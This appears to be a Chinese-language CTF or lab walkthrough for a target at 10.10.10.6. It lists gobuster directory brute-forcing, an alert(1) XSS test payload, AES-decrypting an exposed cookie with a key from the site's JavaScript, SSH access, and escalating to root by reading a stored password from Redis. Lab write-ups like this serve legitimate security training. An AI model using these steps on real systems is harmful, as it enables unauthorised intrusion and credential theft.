# 服务扫描

使用 nmap 扫描出靶机为 10.10.10.6，
开放端口为 22、80，

使用 gobuster 爆破目录

```
sudo gobuster dir -u http://10.10.10.6 -w /usr/share/dirb/wordlists/common.txt
```

![[Pasted image 20250514202421.png]]

# WEB 渗透

网页点击图片可以查看详情

![[Pasted image 20250514202536.png]]

在目录爆破发现的网站中可以找到 javascript 源码

![[Pasted image 20250514202614.png]]


拼接字符串可以实现注入，
拼接字符串发现 xss 漏洞


```
10.10.10.6/opus-details.php?id=<script>alert(1)</script>
```

![[Pasted image 20250514202806.png]]

暴露 cookie

![[Pasted image 20250514202852.png]]

cookie 和 js 源码发现的 decrypt 一起使用 AES 解密
[AES 解密](https://www.sojson.com/encrypt_aes.html)

![[Pasted image 20250514203127.png]]

# Linux 提权

连接 ssh

```
ssh auxerre@10.10.10.6    
```

下载 Linpeas 发现 redis 开放，

```
ps aux

ps aux | grep "redis"

redis-cli

keys *

get rootpass

su root
```